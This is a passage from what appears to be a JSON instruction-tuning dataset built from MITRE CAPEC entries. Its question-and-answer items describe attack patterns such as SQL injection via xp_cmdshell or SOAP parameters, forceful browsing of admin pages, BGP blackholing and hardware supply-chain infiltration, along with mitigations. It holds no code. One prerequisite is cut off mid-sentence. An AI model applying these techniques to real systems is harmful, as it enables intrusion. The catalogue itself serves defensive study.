              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Infiltration of Hardware Development Environment (CAPEC ID: 537)",
    "context": "",
    "output": "The adversary, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for hardware and/or firmware design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the adversary to remotely compromise the adjacent hardware development system from the manufacturer's workstation. The adversary is then able to exfiltrate and alter sensitive data on the hardware system, allowing for future compromise once the developed system is deployed at the victim location.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The adversary, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for hardware and/or firmware design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the adversary to remotely compromise the adjacent hardware development system from the manufacturer's workstation. The adversary is then able to exfiltrate and alter sensitive data on the hardware system, allowing for future compromise once the developed system is deployed at the victim location.",
      "@Name": "Infiltration of Hardware Development Environment (CAPEC ID: 537)",
      "attack_ptrn": {
        "@ID": "537",
        "@Name": "Infiltration of Hardware Development Environment",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary, leveraging the ability to manipulate components of primary support systems and tools within the development and production environments, inserts malicious software within the hardware and/or firmware development environment. The infiltration purpose is to alter developed hardware components in a system destined for deployment at the victim's organization, for the purpose of disruption or further compromise.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "444",
            "Exclude_Related": {
              "@Exclude_ID": "513"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).",
            "The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.",
            "The adversary must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "Intelligence about the manufacturer's operating environment and infrastructure."
            },
            {
              "@Level": "High",
              "#text": "Ability to develop, deploy, and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment."
            },
            {
              "@Level": "High",
              "#text": "Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS, anti-virus, etc)"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Verify software downloads and updates to ensure they have not been modified be adversaries",
            "Leverage antivirus tools to detect known malware",
            "Do not download software from untrusted sources",
            "Educate designers, developers, engineers, etc. on social engineering attacks to avoid downloading malicious software via attacks such as phishing attacks"
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "The adversary, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for hardware and/or firmware design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the adversary to remotely compromise the adjacent hardware development system from the manufacturer's workstation. The adversary is then able to exfiltrate and alter sensitive data on the hardware system, allowing for future compromise once the developed system is deployed at the victim location."
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.003",
            "Entry_Name": "Supply Chain Compromise: Compromise Hardware Supply Chain"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-712"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Mitigations, Prerequisites, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Command Line Execution through SQL Injection (CAPEC ID: 108)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function (CVE-2006-6799).\n* Reference: https://www.cve.org/CVERecord?id=CVE-2006-6799",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function (CVE-2006-6799).",
        "Reference: https://www.cve.org/CVERecord?id=CVE-2006-6799"
      ],
      "@Name": "Command Line Execution through SQL Injection (CAPEC ID: 108)",
      "attack_ptrn": {
        "@ID": "108",
        "@Name": "Command Line Execution through SQL Injection",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "66"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into user-controllable data inputs to search unfiltered execution of the SQL syntax in a query."
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Achieve arbitrary command execution through SQL Injection with the MSSQL_xp_cmdshell directive] The attacker leverages a SQL Injection attack to inject shell code to be executed by leveraging the xp_cmdshell directive."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Inject malicious data in the database] Leverage SQL injection to inject data in the database that could later be used to achieve command injection if ever used as a command line argument"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Trigger command line execution with injected arguments] The attacker causes execution of command line functionality which leverages previously injected database content as arguments."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The application does not properly validate data before storing in the database",
            "Backend application implicitly trusts the data stored in the database",
            "Malicious data is used on the backend as a command line argument"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "The attacker most likely has to be familiar with the internal functionality of the system to launch this attack. Without that knowledge, there are not many feedback mechanisms to give an attacker the indication of how to perform command injection or whether the attack is succeeding."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Disable MSSQL xp_cmdshell directive on the database",
            "Properly validate the data (syntactically and semantically) before writing it to the database.",
            "Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument)."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function (CVE-2006-6799).",
              "Reference: https://www.cve.org/CVERecord?id=CVE-2006-6799"
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "89"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "78"
            },
            {
              "@CWE_ID": "114"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: SQL Injection through SOAP Parameter Tampering (CAPEC ID: 110), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: An attacker uses a travel booking system that leverages SOAP communication between the client and the travel booking service. An attacker begins to tamper with the outgoing SOAP messages by modifying their parameters to include characters that would break a dynamically constructed SQL query. They notice that the system fails to respond when these malicious inputs are injected in certain parameters transferred in a SOAP message. The attacker crafts a SQL query that modifies their payment amount in the travel system's database and passes it as one of the parameters . A backend batch payment system later fetches the payment amount from the database (the modified payment amount) and sends to the credit card processor, enabling the attacker to purchase the airfare at a lower price. An attacker needs to have some knowledge of the system's database, perhaps by exploiting another weakness that results in information disclosure.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An attacker uses a travel booking system that leverages SOAP communication between the client and the travel booking service. An attacker begins to tamper with the outgoing SOAP messages by modifying their parameters to include characters that would break a dynamically constructed SQL query. They notice that the system fails to respond when these malicious inputs are injected in certain parameters transferred in a SOAP message. The attacker crafts a SQL query that modifies their payment amount in the travel system's database and passes it as one of the parameters . A backend batch payment system later fetches the payment amount from the database (the modified payment amount) and sends to the credit card processor, enabling the attacker to purchase the airfare at a lower price. An attacker needs to have some knowledge of the system's database, perhaps by exploiting another weakness that results in information disclosure.",
      "@Name": "SQL Injection through SOAP Parameter Tampering (CAPEC ID: 110)",
      "attack_ptrn": {
        "@ID": "110",
        "@Name": "SQL Injection through SOAP Parameter Tampering",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "66"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "108"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Detect Incorrect SOAP Parameter Handling] The attacker tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.",
              "Technique": "The attacker tampers with the SOAP message parameters by injecting some special characters such as single quotes, double quotes, semi columns, etc. The attacker observes system behavior."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into vulnerable SOAP parameters identified during the Explore phase to search for unfiltered execution of the SQL syntax in a query."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Inject SQL via SOAP Parameters] The attacker injects SQL via SOAP parameters identified as vulnerable during Explore phase to launch a first or second order SQL injection attack.",
              "Technique": "An attacker performs a SQL injection attack via the usual methods leveraging SOAP parameters as the injection vector. An attacker has to be careful not to break the XML parser at the service provider which may prevent the payload getting through to the SQL query. The attacker may also look at the WSDL for the web service (if available) to better understand what is expected by the service provider."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "SOAP messages are used as a communication mechanism in the system",
            "SOAP parameters are not properly validated at the service provider",
            "The service provider does not properly utilize parameter binding when building SQL queries"
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "If the attacker is able to gain good understanding of the system's database schema"
            },
            {
              "@Level": "High",
              "#text": "If the attacker has to perform Blind SQL Injection"
            }
          ]
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Properly validate and sanitize/reject user input at the service provider.",
            "Ensure that prepared statements or other mechanism that enables parameter binding is used when accessing the database in a way that would prevent the attackers' supplied data from controlling the structure of the executed query.",
            "At the database level, ensure that the database user used by the application in a particular context has the minimum needed privileges to the database that are needed to perform the operation. When possible, run queries against pre-generated views rather than the tables directly."
          ]
        },
        "Example_Instances": {
          "Example": "An attacker uses a travel booking system that leverages SOAP communication between the client and the travel booking service. An attacker begins to tamper with the outgoing SOAP messages by modifying their parameters to include characters that would break a dynamically constructed SQL query. They notice that the system fails to respond when these malicious inputs are injected in certain parameters transferred in a SOAP message. The attacker crafts a SQL query that modifies their payment amount in the travel system's database and passes it as one of the parameters . A backend batch payment system later fetches the payment amount from the database (the modified payment amount) and sends to the credit card processor, enabling the attacker to purchase the airfare at a lower price. An attacker needs to have some knowledge of the system's database, perhaps by exploiting another weakness that results in information disclosure."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "89"
            },
            {
              "@CWE_ID": "20"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns, Skills_Required"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'User-Controlled Filename (CAPEC ID: 73)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: Phishing attacks rely on a user clicking on links on that are supplied to them by attackers masquerading as a trusted resource such as a bank or online auction site. The end user's email client hosts the supplied resource name in this case via email. The resource name, however may either 1) direct the client browser to a malicious site to steal credentials and/or 2) execute code on the client machine to probe the victim's host system and network environment.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Phishing attacks rely on a user clicking on links on that are supplied to them by attackers masquerading as a trusted resource such as a bank or online auction site. The end user's email client hosts the supplied resource name in this case via email. The resource name, however may either 1) direct the client browser to a malicious site to steal credentials and/or 2) execute code on the client machine to probe the victim's host system and network environment.",
      "@Name": "User-Controlled Filename (CAPEC ID: 73)",
      "attack_ptrn": {
        "@ID": "73",
        "@Name": "User-Controlled Filename",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attack of this type involves an adversary inserting malicious characters (such as a XSS redirection) into a filename, directly or indirectly that is then used by the target software to generate HTML text or other potentially executable content. Many websites rely on user-generated content and dynamically build resources like files, filenames, and URL links directly from user supplied data. In this attack pattern, the attacker uploads code that can execute in the client browser and/or redirect the client browser to a site that the attacker owns. All XSS attack payload variants can be used to pass and exploit these vulnerabilities.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "165"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "592"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The victim must trust the name and locale of user controlled filenames."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To achieve a redirection and use of less trusted source, an attacker can simply edit data that the host uses to build the filename"
            },
            {
              "@Level": "Medium",
              "#text": "Deploying a malicious \"look-a-like\" site (such as a site masquerading as a bank or online auction site) that the user enters their authentication data into."
            },
            {
              "@Level": "High",
              "#text": "Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process."
            }
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Availability",
              "Impact": "Alter Execution Logic"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use browser technologies that do not allow client side scripting.",
            "Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.",
            "Implementation: Perform input validation for all remote content.",
            "Implementation: Perform output validation for all remote content.",
            "Implementation: Disable scripting languages such as JavaScript in browser",
            "Implementation: Scan dynamically generated content against validation specification"
          ]
        },
        "Example_Instances": {
          "Example": "Phishing attacks rely on a user clicking on links on that are supplied to them by attackers masquerading as a trusted resource such as a bank or online auction site. The end user's email client hosts the supplied resource name in this case via email. The resource name, however may either 1) direct the client browser to a malicious site to steal credentials and/or 2) execute code on the client machine to probe the victim's host system and network environment."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "184"
            },
            {
              "@CWE_ID": "96"
            },
            {
              "@CWE_ID": "348"
            },
            {
              "@CWE_ID": "116"
            },
            {
              "@CWE_ID": "350"
            },
            {
              "@CWE_ID": "86"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2017-05-01",
            "Modification_Comment": "Updated Description Summary, Related_Attack_Patterns"
          }
        }
      }
    }
  },
  {
    "instruction": "List examples for 'BGP Route Disabling (CAPEC ID: 584)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - BGP Route Disabling (CAPEC ID: 584) are: Blackholing: The adversary intentionally references false routing advertisements in order to attract traffic to a particular router so it can be dropped.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Blackholing: The adversary intentionally references false routing advertisements in order to attract traffic to a particular router so it can be dropped.",
      "@Name": "BGP Route Disabling (CAPEC ID: 584)",
      "attack_ptrn": {
        "@ID": "584",
        "@Name": "BGP Route Disabling",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary suppresses the Border Gateway Protocol (BGP) advertisement for a route so as to render the underlying network inaccessible. The BGP protocol helps traffic move throughout the Internet by selecting the most efficient route between Autonomous Systems (AS), or routing domains. BGP is the basis for interdomain routing infrastructure, providing connections between these ASs. By suppressing the intended AS routing advertisements and/or forcing less effective routes for traffic to ASs, the adversary can deny availability for the target network.",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "582",
            "Exclude_Related": [
              {
                "@Exclude_ID": "403"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have control of a router that can modify, drop, or introduce spoofed BGP updates.The adversary can convince"
        },
        "Resources_Required": {
          "Resource": "BGP Router"
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Other",
            "Note": "Disabling a network route at the routing infrastructure level denies availability of that route."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Implement Ingress filters to check the validity of received routes. However, this relies on the accuracy of Internet Routing Registries (IRRs) databases which are often not well-maintained.",
            "Implement Secure BGP (S-BGP protocol), which improves authorization and authentication capabilities based on public-key cryptography."
          ]
        },
        "Example_Instances": {
          "Example": "Blackholing: The adversary intentionally references false routing advertisements in order to attract traffic to a particular router so it can be dropped."
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-465"
            },
            {
              "@External_Reference_ID": "REF-466"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "Seamus Tuohy",
            "Submission_Date": "2017-01-12"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Mitigations"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Forceful Browsing (CAPEC ID: 87)",
    "context": "",
    "output": "Possible examples: A bulletin board application provides an administrative interface at admin.aspx when the user logging in belongs to the administrators group.\n- An attacker can access the admin.aspx interface by making a direct request to the page. Not having access to the interface appropriately protected allows the attacker to perform administrative functions without having to authenticate themself in that role.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A bulletin board application provides an administrative interface at admin.aspx when the user logging in belongs to the administrators group.",
        "An attacker can access the admin.aspx interface by making a direct request to the page. Not having access to the interface appropriately protected allows the attacker to perform administrative functions without having to authenticate themself in that role."
      ],
      "@Name": "Forceful Browsing (CAPEC ID: 87)",
      "attack_ptrn": {
        "@ID": "87",
        "@Name": "Forceful Browsing",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker employs forceful browsing (direct URL entry) to access portions of a website that are otherwise unreachable. Usually, a front controller or similar design pattern is employed to protect access to portions of a web application. Forceful browsing enables an attacker to access information, perform privileged operations and otherwise reach sections of the web application that have been improperly protected.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "115"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Spider] Using an automated tool, an attacker follows all public links on a web site. They record all the links they find.",
              "Technique": [
                "Use a spidering tool to follow and record all links.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt well-known or guessable resource locations] Using an automated tool, an attacker requests a variety of well-known URLs that correspond to administrative, debugging, or other useful internal actions. They record all the positive responses from the server.",
              "Technique": [
                "Use a spidering tool to follow and record attempts on well-known URLs.",
                "Use a proxy tool to record all links visited during a manual traversal of attempts on well-known URLs."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Use unauthorized resources] By visiting the unprotected resource, the attacker makes use of unauthorized functionality.",
              "Technique": "Access unprotected functions and execute them."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[View unauthorized data] The attacker discovers and views unprotected sensitive data.",
              "Technique": "Direct request of protected pages that directly access database back-ends. (e.g., list.jsp, accounts.jsp, status.jsp, etc.)"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The forcibly browseable pages or accessible resources must be discoverable and improperly protected."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Forcibly browseable pages can be discovered by using a number of automated tools. Doing the same manually is tedious but by no means difficult."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack. A directory listing is helpful, but not a requirement."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Authenticate request to every resource. In addition, every page or resource must ensure that the request it is handling has been made in an authorized context.",
            "Forceful browsing can also be made difficult to a large extent by not hard-coding names of application pages or resources. This way, the attacker cannot figure out, from the application alone, the resources available from the present context."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "A bulletin board application provides an administrative interface at admin.aspx when the user logging in belongs to the administrators group.",
              "An attacker can access the admin.aspx interface by making a direct request to the page. Not having access to the interface appropriately protected allows the attacker to perform administrative functions without having to authenticate themself in that role."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "425"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "34",
              "Entry_Name": "Predictable Resource Location"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Forced browsing"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Related_Attack_Patterns, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Adversary in the Middle (AiTM) (CAPEC ID: 94)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Adversary in the Middle (AiTM) (CAPEC ID: 94) are: In 2017, security researcher Jerry Decime discovered that Equifax mobile applications were not leveraging HTTPS in all areas. Although authentication was properly utilizing HTTPS, in addition to validating the root of trust of the server certificate, other areas of the application were using HTTP to communicate. Adversaries could then conduct MITM attacks on rogue WiFi or cellular networks and hijack the UX. This further allowed the adversaries to prompt users for sensitive data, which could then be obtained in the plaintext response. [REF-636]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In 2017, security researcher Jerry Decime discovered that Equifax mobile applications were not leveraging HTTPS in all areas. Although authentication was properly utilizing HTTPS, in addition to validating the root of trust of the server certificate, other areas of the application were using HTTP to communicate. Adversaries could then conduct MITM attacks on rogue WiFi or cellular networks and hijack the UX. This further allowed the adversaries to prompt users for sensitive data, which could then be obtained in the plaintext response. [REF-636]",
      "@Name": "Adversary in the Middle (AiTM) (CAPEC ID: 94)",
      "attack_ptrn": {
        "@ID": "94",
